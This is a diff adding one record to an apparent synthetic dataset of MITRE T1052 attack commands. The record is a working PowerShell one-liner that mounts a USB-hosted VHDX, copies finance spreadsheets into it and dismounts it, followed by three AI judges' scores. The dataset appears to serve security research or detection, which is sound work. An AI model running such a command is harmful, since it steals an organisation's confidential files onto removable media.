@@ -1,0 +1,58 @@
+{
+  "technique_id": "T1052",
+  "platform": "Windows",
+  "shell": "Powershell",
+  "command": "$usb=(Get-Volume | Where-Object {$_.DriveType -eq 'Removable' -and $_.DriveLetter} | Select-Object -First 1 -ExpandProperty DriveLetter)+':\\'; $vhd=Join-Path $usb 'stash.vhdx'; Mount-DiskImage -ImagePath $vhd -PassThru | Out-Null; $dl=((Get-DiskImage -ImagePath $vhd | Get-Disk | Get-Partition | Get-Volume)[0].DriveLetter); New-Item -ItemType Directory -Path \"$($dl):\\Rpts\" -Force | Out-Null; Copy-Item -Path 'C:\\Finance\\Q*\\*.xlsx' -Destination \"$($dl):\\Rpts\" -Recurse -Force; Dismount-DiskImage -ImagePath $vhd",
+  "explanation": "Mounts a VHDX stored on the USB, copies financial spreadsheets into it, then cleanly dismounts.",
+  "rationale_steps": [
+    "Locate removable drive and VHDX container",
+    "Mount VHDX using Mount-DiskImage",
+    "Copy selected data into mounted image",
+    "Dismount image to persist data on removable media"
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1052-b282912d-3ef24ae6",
+  "source_prompt_hash": "b282912d",
+  "timestamp_utc": "2025-09-30T05:30:27.458223Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Well-formed PowerShell with balanced quoting/parentheses, valid cmdlets/parameters, and correct use of pipelines, indexing, and separators.",
+        "semantic_score": 4,
+        "semantic_justification": "Implements exfiltration to a physical medium by mounting a USB-hosted VHDX, copying targeted files, and dismounting, but mounting VHDs typically requires administrative privileges, contradicting the stated 'Privilege: None'.",
+        "combined_score": 4.5,
+        "confidence": 0.8,
+        "timestamp": "2025-10-01T08:31:23.966851Z"
+      },
+      {
+        "model": "claude-sonnet-4-6",
+        "syntactic_score": 5,
+        "syntactic_justification": "The PowerShell command is well-formed with balanced parentheses, proper string concatenation, valid cmdlet names, correct parameter usage, and appropriate semicolon separators throughout the pipeline chain.",
+        "semantic_score": 5,
+        "semantic_justification": "The command precisely implements T1052 by detecting a removable USB drive, mounting a VHDX container (providing obfuscation/packaging of exfiltrated data), copying targeted financial spreadsheets (C:\\Finance\\Q*\\*.xlsx) into the hidden volume, and cleanly dismounting to reduce forensic artifacts — fully consistent with staging, obfuscation, and physical medium exfiltration behaviors described in the technique.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2026-02-18T22:36:30.998875Z"
+      },
+      {
+        "model": "gemini-3-flash-preview",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command follows valid PowerShell syntax with properly balanced parentheses, correct piping, and valid cmdlet usage.",
+        "semantic_score": 5,
+        "semantic_justification": "The logic correctly identifies a removable drive, mounts a virtual disk for staging, copies sensitive financial data, and cleans up by dismounting, perfectly aligning with the T1052 technique.",
+        "combined_score": 5.0,
+        "confidence": 1.0,
+        "timestamp": "2026-02-18T22:36:33.455123Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 4.667,
+    "llm_average_score": 4.833,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
